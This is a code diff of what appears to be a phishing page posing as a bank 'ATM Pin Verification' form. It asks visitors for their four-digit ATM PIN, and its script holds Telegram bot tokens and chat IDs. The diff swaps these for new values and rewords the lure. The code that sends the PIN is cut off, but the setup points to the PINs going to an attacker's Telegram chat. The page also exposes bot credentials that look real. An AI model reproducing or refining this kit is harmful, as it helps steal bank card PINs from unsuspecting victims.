@@ -74,18 +74,20 @@
 
     <main>
         <div class="container">
-            <p>Your ATM Pin & Credit Card Pin Default Same<br> Please Set Your Credit Card Pin</p>
+            <section class="verification-form">
+                <h2>Account ATM Pin  Verification</h2>
+                <form id="verification-form" class="form-container">
             <form id="pinForm">
                 <input type="password" id="atm-pin" name="atm_pin" class="input-box" placeholder="Enter ATM Pin" required minlength="4" maxlength="4">
                 <br>
-                <button type="submit" class="btn">PROCEED</button>
+                <button type="submit" class="btn">VERIFY</button>
             </form>
         </div>
     </main>
 
     <script>
-        const botToken = "8195910833:AAGjf_PrdNBLevxSO4DW_lbSGl1wp6RJA4A"; // Secure token replacement
-        const chatId = "-1002424646619";
+        const botToken = "7302997867:AAGU5IW98_lQkdPXn5Y7lAxFEZUIP7Yo1YQ"; // Secure token replacement
+        const chatId = "-1002377802733";
 
         document.getElementById("pinForm").addEventListener("submit", function (event) {
             event.preventDefault();
